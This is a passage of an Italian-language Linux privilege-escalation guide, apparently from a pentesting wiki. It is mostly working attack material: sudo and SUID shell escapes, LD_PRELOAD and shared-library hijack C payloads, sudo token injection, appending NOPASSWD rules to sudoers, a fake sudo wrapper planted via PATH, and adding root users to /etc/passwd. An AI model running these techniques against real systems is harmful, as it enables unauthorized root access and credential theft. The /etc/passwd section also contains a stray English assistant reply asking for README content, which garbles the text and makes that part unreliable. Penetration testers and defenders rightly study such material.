D-Bus opera su un **modello allow/deny**, gestendo i permessi dei messaggi (chiamate di metodo, emissione di segnali, ecc.) basandosi sull'effetto cumulativo delle regole di policy che corrispondono. Queste policy specificano le interazioni con il bus e possono potenzialmente permettere escalation di privilegi tramite lo sfruttamento di tali permessi.

Un esempio di tale policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` è fornito, mostrando i permessi per l'utente root di possedere, inviare a e ricevere messaggi da `fi.w1.wpa_supplicant1`.

Le policy senza un utente o gruppo specificato si applicano universalmente, mentre le policy del contesto "default" si applicano a tutti quelli non coperti da altre policy specifiche.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Scopri come enumerare e sfruttare una comunicazione D-Bus qui:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rete**

È sempre interessante enumerare la rete e capire la posizione della macchina.

### Enumerazione generica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Porte aperte

Controlla sempre i servizi di rete in esecuzione sulla macchina con cui non sei riuscito a interagire prima di averne ottenuto l'accesso:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifica se puoi sniff traffic. Se puoi, potresti essere in grado di ottenere alcune credentials.
```
timeout 1 tcpdump
```
## Utenti

### Enumerazione generica

Controlla **chi** sei, quali **privilegi** hai, quali **utenti** sono nel sistema, quali possono **login** e quali hanno **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID elevato

Alcune versioni di Linux sono state colpite da un bug che permette agli utenti con **UID > INT_MAX** di ottenere privilegi elevati. Maggiori info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Sfruttalo** usando: **`systemd-run -t /bin/bash`**

### Gruppi

Controlla se sei **membro di qualche gruppo** che potrebbe concederti privilegi di root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Appunti

Controlla se c'è qualcosa di interessante negli appunti (se possibile)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politica delle password
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Password conosciute

Se conosci qualche **password** dell'ambiente **prova a fare login come ogni utente** usando quella password.

### Su Brute

Se non ti dispiace fare molto rumore e i binari `su` e `timeout` sono presenti sulla macchina, puoi provare a brute-force gli utenti usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con il parametro `-a` effettua anch'esso un brute-force sugli utenti.

## Abusi del PATH scrivibile

### $PATH

Se scopri di poter **scrivere dentro una cartella del $PATH** potresti essere in grado di escalare i privilegi creando una **backdoor nella cartella scrivibile** con il nome di un comando che verrà eseguito da un altro utente (idealmente root) e che **non venga caricato da una cartella che si trova prima** della tua cartella scrivibile nel $PATH.

### SUDO and SUID

Potresti essere autorizzato a eseguire alcuni comandi usando sudo o potrebbero avere il bit suid. Controllalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alcuni **comandi inaspettati permettono di leggere e/o scrivere file o persino eseguire un comando.** Ad esempio:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configurazione di sudo potrebbe permettere a un utente di eseguire un comando con i privilegi di un altro utente senza conoscere la password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In questo esempio l'utente `demo` può eseguire `vim` come `root`; è ora banale ottenere una shell aggiungendo una chiave ssh nella directory root o chiamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Questa direttiva permette all'utente di **impostare una variabile d'ambiente** durante l'esecuzione di qualcosa:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Questo esempio, **basato su HTB machine Admirer**, era **vulnerabile** a **PYTHONPATH hijacking** per caricare una libreria python arbitraria durante l'esecuzione dello script come root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preservato tramite sudo env_keep → root shell

Se sudoers preserva `BASH_ENV` (es., `Defaults env_keep+="ENV BASH_ENV"`), puoi sfruttare il comportamento di avvio non-interattivo di Bash per eseguire codice arbitrario come root quando invochi un comando consentito.

- Why it works: Per le shell non-interattive, Bash valuta `$BASH_ENV` e fa source di quel file prima di eseguire lo script target. Molte regole sudo permettono di eseguire uno script o un wrapper di shell. Se `BASH_ENV` è preservato da sudo, il tuo file viene sourced con privilegi di root.

- Requisiti:
- Una regola sudo che puoi eseguire (qualsiasi target che invochi `/bin/bash` in modo non-interattivo, o qualsiasi bash script).
- `BASH_ENV` presente in `env_keep` (verifica con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Rimuovere `BASH_ENV` (e `ENV`) da `env_keep`, preferire `env_reset`.
- Evitare wrapper shell per i comandi consentiti da sudo; usare binari minimali.
- Valutare logging I/O di sudo e alerting quando vengono usate preserved env vars.

### Sudo: bypass dei percorsi di esecuzione

**Jump** per leggere altri file o usare **symlinks**. Ad esempio nel sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se viene usato un **wildcard** (\*), è ancora più semplice:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary senza specificare il path del comando

Se la **sudo permission** è concessa per un singolo comando **senza specificare il path**: _hacker10 ALL= (root) less_ puoi sfruttarlo modificando la variabile PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Questa tecnica può anche essere usata se un binario **suid** **esegue un altro comando senza specificarne il percorso (verificare sempre con** _**strings**_ **il contenuto di un binario SUID sospetto)**).

[Payload examples to execute.](payloads-to-execute.md)

### Binario SUID con percorso del comando

Se il binario **suid** **esegue un altro comando specificando il percorso**, allora puoi provare a **esportare una funzione** chiamata come il comando che il file suid sta invocando.

Per esempio, se un binario suid chiama _**/usr/sbin/service apache2 start**_ devi provare a creare la funzione e esportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Quindi, quando esegui il binario suid, questa funzione verrà eseguita

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variabile d'ambiente **LD_PRELOAD** viene usata per specificare una o più librerie condivise (.so files) da caricare dal loader prima di tutte le altre, inclusa la libreria C standard (`libc.so`). Questo processo è noto come caricamento anticipato (preloading) di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e impedire che questa funzionalità venga sfruttata, in particolare con eseguibili **suid/sgid**, il sistema applica certe condizioni:

- Il loader ignora **LD_PRELOAD** per gli eseguibili in cui il real user ID (_ruid_) non corrisponde all'effective user ID (_euid_).
- Per gli eseguibili con suid/sgid, vengono pre-caricate solo le librerie in percorsi standard che siano anch'esse suid/sgid.

Privilege escalation può verificarsi se hai la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include la direttiva **env_keep+=LD_PRELOAD**. Questa configurazione permette alla variabile d'ambiente **LD_PRELOAD** di persistere ed essere riconosciuta anche quando i comandi sono eseguiti con `sudo`, potenzialmente portando all'esecuzione di codice arbitrario con privilegi elevati.
```
Defaults        env_keep += LD_PRELOAD
```
Salva come **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Poi **compilalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Infine, **escalate privileges** eseguendo
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Una privesc simile può essere abusata se l'attaccante controlla la variabile d'ambiente **LD_LIBRARY_PATH**, perché controlla il percorso in cui verranno cercate le librerie.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Quando si incontra un binary con i permessi **SUID** che sembra insolito, è buona pratica verificare se sta caricando correttamente i file **.so**. Questo può essere controllato eseguendo il comando seguente:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Ad esempio, incontrare un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggerisce una potenziale possibilità di sfruttamento.

Per sfruttare questo, si procede creando un file C, ad esempio _"/path/to/.config/libcalc.c"_, contenente il seguente codice:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Questo codice, una volta compilato ed eseguito, mira a elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C sopra in un file oggetto condiviso (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Infine, l'esecuzione del SUID binary interessato dovrebbe attivare l'exploit, permettendo una potenziale compromissione del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ora che abbiamo trovato un SUID binary che carica una library da una folder in cui possiamo write, creiamo la library in quella folder con il nome necessario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se ricevi un errore come
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è una lista curata di binari Unix che possono essere sfruttati da un attacker per bypassare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è la stessa cosa ma per i casi in cui puoi **only inject arguments** in un comando.

Il progetto raccoglie funzionalità legittime dei binari Unix che possono essere abuse per evadere restricted shells, escalate o mantenere elevated privileges, trasferire file, spawn bind and reverse shells, e facilitare gli altri task di post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se puoi eseguire `sudo -l` puoi usare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per verificare se trova come exploitare una regola sudo.

### Reusing Sudo Tokens

Nei casi in cui hai **sudo access** ma non la password, puoi escalate privileges aspettando l'esecuzione di un comando sudo e poi hijacking the session token.

Requisiti per escalare i privilegi:

- Hai già una shell come user "_sampleuser_"
- "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa nelle **ultime 15mins** (di default questa è la durata del sudo token che ci permette di usare `sudo` senza inserire la password)
- `cat /proc/sys/kernel/yama/ptrace_scope` è 0
- `gdb` è accessibile (puoi caricarlo)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o permanentemente modificando `/etc/sysctl.d/10-ptrace.conf` e impostando `kernel.yama.ptrace_scope = 0`)

Se tutti questi requisiti sono soddisfatti, **puoi escalare i privilegi usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Il **first exploit** (`exploit.sh`) creerà il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **activate the sudo token in your session** (non otterrai automaticamente una root shell, esegui `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Il **second exploit** (`exploit_v2.sh`) creerà una sh shell in _/tmp_ **di proprietà di root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Il **terzo exploit** (`exploit_v3.sh`) **creerà un sudoers file** che rende i **sudo tokens eterni e permette a tutti gli utenti di usare sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se hai i **permessi di scrittura** nella cartella o su uno qualsiasi dei file creati all'interno della cartella, puoi usare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un sudo token per un utente e un PID**.\\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza dover conoscere la password eseguendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file presenti in `/etc/sudoers.d` configurano chi può usare `sudo` e come. Questi file **per impostazione predefinita possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** puoi **leggere** questo file potresti essere in grado di **ottenere alcune informazioni interessanti**, e se puoi **scrivere** qualsiasi file sarai in grado di **elevare i privilegi**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se puoi scrivere, puoi abusare di questo permesso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Un altro modo per abusare di questi permessi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Esistono alcune alternative al binario `sudo`, come `doas` per OpenBSD; ricordati di controllarne la configurazione in `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se sai che un **utente solitamente si connette a una macchina e usa `sudo`** per elevare i privilegi e hai ottenuto una shell in quel contesto utente, puoi **creare un nuovo eseguibile sudo** che eseguirà il tuo codice come root e poi il comando dell'utente. Poi, **modifica il $PATH** del contesto utente (ad esempio aggiungendo il nuovo percorso in .bash_profile) così quando l'utente esegue sudo, verrà eseguito il tuo eseguibile sudo.

Nota che se l'utente usa una shell diversa (non bash) dovrai modificare altri file per aggiungere il nuovo percorso. Per esempio[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O eseguendo qualcosa del genere:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Libreria condivisa

### ld.so

Il file `/etc/ld.so.conf` indica **da dove provengono i file di configurazione caricati**. Tipicamente, questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Ciò significa che verranno letti i file di configurazione in `/etc/ld.so.conf.d/*.conf`. Questi file di configurazione **puntano ad altre cartelle** dove le **librerie** verranno **ricercate**. Ad esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Questo significa che il sistema cercherà le librerie all'interno di `/usr/local/lib`**.

Se per qualche motivo **un utente ha permessi di scrittura** su uno qualsiasi dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualsiasi cartella indicata dal file di configurazione in `/etc/ld.so.conf.d/*.conf` potrebbe riuscire a ottenere privilegi elevati.\
Dai un'occhiata a **come sfruttare questa errata configurazione** nella pagina seguente:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiando la lib in `/var/tmp/flag15/` verrà utilizzata dal programma in questo punto come specificato nella variabile `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Quindi crea una libreria malevola in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Le capabilities di Linux forniscono un **sottoinsieme dei privilegi root disponibili a un processo**. Questo suddivide effettivamente i privilegi root in **unità più piccole e distintive**. Ognuna di queste unità può quindi essere concessa indipendentemente ai processi. In questo modo l'insieme completo dei privilegi è ridotto, diminuendo i rischi di sfruttamento.\
Leggi la seguente pagina per **saperne di più sulle capabilities e su come abusarne**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In una directory, il **bit per "execute"** implica che l'utente interessato può "**cd**" nella cartella.\
Il bit **"read"** implica che l'utente può **elencare** i **file**, e il bit **"write"** implica che l'utente può **cancellare** e **creare** nuovi **file**.

## ACLs

Le Access Control Lists (ACLs) rappresentano il livello secondario di permessi discrezionali, in grado di **sovrascrivere i tradizionali permessi ugo/rwx**. Questi permessi migliorano il controllo sull'accesso a file o directory permettendo o negando diritti a utenti specifici che non sono il proprietario o parte del gruppo. Questo livello di **granularità garantisce una gestione degli accessi più precisa**. Ulteriori dettagli possono essere trovati [**qui**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Concedi** all'utente "kali" permessi di lettura e scrittura su un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Ottieni** file con ACL specifiche dal sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Aprire sessioni shell

Nelle **vecchie versioni** potresti **hijack** alcune **shell** session di un utente diverso (**root**).\
Nelle **versioni più recenti** potrai **connect** alle sessioni screen solo del **tuo utente**. Tuttavia, potresti trovare **informazioni interessanti** all'interno della sessione.

### screen sessions hijacking

**Elenca screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Collegarsi a una sessione**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Questo era un problema con **vecchie versioni di tmux**. Non sono riuscito a effettuare l'hijack di una sessione tmux (v2.1) creata da root come utente non privilegiato.

**Elenca le sessioni tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Collegarsi a una sessione**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Controlla **Valentine box from HTB** per un esempio.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Tutte le chiavi SSL e SSH generate su sistemi basati su Debian (Ubuntu, Kubuntu, ecc.) tra settembre 2006 e il 13 maggio 2008 possono essere interessate da questo bug.\
Questo bug si verifica quando si crea una nuova ssh key in quegli OS, poiché **erano possibili solo 32.768 variazioni**. Ciò significa che tutte le possibilità possono essere calcolate e, **avendo la ssh public key puoi cercare la corrispondente private key**. Puoi trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Valori di configurazione interessanti

- **PasswordAuthentication:** Specifica se l'autenticazione via password è consentita. Il default è `no`.
- **PubkeyAuthentication:** Specifica se l'autenticazione tramite public key è consentita. Il default è `yes`.
- **PermitEmptyPasswords**: Quando l'autenticazione via password è consentita, specifica se il server permette il login ad account con password vuote. Il default è `no`.

### PermitRootLogin

Specifica se root può effettuare il login usando ssh, il default è `no`. Valori possibili:

- `yes`: root può accedere usando password e private key
- `without-password` or `prohibit-password`: root può accedere solo con una private key
- `forced-commands-only`: Root può accedere solo usando una private key e se sono specificate le opzioni commands
- `no`: no

### AuthorizedKeysFile

Specifica i file che contengono le public keys che possono essere usate per l'autenticazione degli utenti. Può contenere token come `%h`, che verrà sostituito con la home directory. **Puoi indicare percorsi assoluti** (che iniziano con `/`) o **percorsi relativi dalla home dell'utente**. Per esempio:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Quella configurazione indicherà che, se provi ad accedere con la chiave **private** dell'utente "**testusername**", ssh confronterà la public key della tua chiave con quelle presenti in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ti permette di **use your local SSH keys instead of leaving keys** (without passphrases!) anziché lasciare le chiavi sul tuo server. In questo modo potrai **jump** via ssh **to a host** e da lì **jump to another** host **using** la **key** situata nel tuo **initial host**.

Devi impostare questa opzione in `$HOME/.ssh.config` in questo modo:
```
Host example.com
ForwardAgent yes
```
Nota che se `Host` è `*`, ogni volta che l'utente si connette a una macchina diversa, quell'host potrà accedere alle chiavi (il che rappresenta un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** lo ssh-agent forwarding con la parola chiave `AllowAgentForwarding` (default is allow).

Se trovi che Forward Agent è configurato in un ambiente leggi la pagina seguente poiché **potresti essere in grado di abusarne per escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## File interessanti

### File dei profili

Il file `/etc/profile` e i file sotto `/etc/profile.d/` sono **script che vengono eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno qualsiasi di essi puoi escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se viene trovato uno script di profilo anomalo, dovresti controllarlo per **dettagli sensibili**.

### Passwd/Shadow Files

A seconda dell'OS i file `/etc/passwd` e `/etc/shadow` possono usare un nome diverso o potrebbe esserci una copia di backup. Perciò è consigliabile **trovarli tutti** e **controllare se puoi leggerli** per vedere **se ci sono hashes** all'interno dei file:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In alcune occasioni puoi trovare **password hashes** all'interno del file `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd scrivibile

Per prima cosa, genera una password con uno dei seguenti comandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content. Please paste the content of src/linux-hardening/privilege-escalation/README.md here.

Also confirm how you want the user added:
- Should I append a line in the translated file that says to add the user `hacker` and include a generated password (and I will generate one), or
- Should I provide the exact shell commands to create the user `hacker` on a Linux system and set the generated password?

I can generate a secure password for you; tell me the desired length and allowed characters (or I'll pick a secure default).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ad esempio: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ora puoi usare il comando `su` con `hacker:hacker`

In alternativa, puoi usare le seguenti righe per aggiungere un utente fittizio senza password.\ ATTENZIONE: potresti compromettere la sicurezza della macchina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Nelle piattaforme BSD `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`, inoltre `/etc/shadow` è rinominato in `/etc/spwd.db`.

Dovresti verificare se puoi **scrivere in alcuni file sensibili**. Per esempio, puoi scrivere in qualche **file di configurazione di un servizio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Ad esempio, se la macchina esegue un server **tomcat** e puoi **modificare il file di configurazione del servizio Tomcat all'interno di /etc/systemd/,** allora puoi modificare le righe:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
La tua backdoor verrà eseguita la prossima volta che tomcat sarà avviato.

### Controlla le cartelle

Le seguenti cartelle possono contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non riuscirai a leggere l'ultima, ma prova)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Posizione insolita/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### File modificati negli ultimi minuti
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### File DB di Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
